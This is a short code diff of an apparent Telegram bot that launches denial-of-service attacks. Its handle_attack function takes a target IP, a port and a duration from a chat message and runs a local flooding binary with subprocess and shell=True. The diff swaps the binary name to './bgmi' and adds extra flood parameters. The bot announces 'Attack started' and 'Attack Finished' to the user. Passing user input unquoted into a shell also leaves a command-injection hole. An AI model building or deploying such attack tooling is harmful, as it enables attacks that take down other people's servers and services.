@@ -371,7 +371,7 @@ def handle_attack(message):
             bot.reply_to(message, f"🔥 Attack started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {attack_time} sec")
 
             # Run the attack command
-            subprocess.run(f"./daksh {target} {port} {attack_time}", shell=True)
+            subprocess.run(f"./bgmi {target} {port} {attack_time} 10 1000", shell=True)
 
             bot.reply_to(message, f"✅ Attack Finished! Target: {target} Port: {port} Time: {attack_time} sec")
         else:
@@ -626,5 +626,4 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-)
 
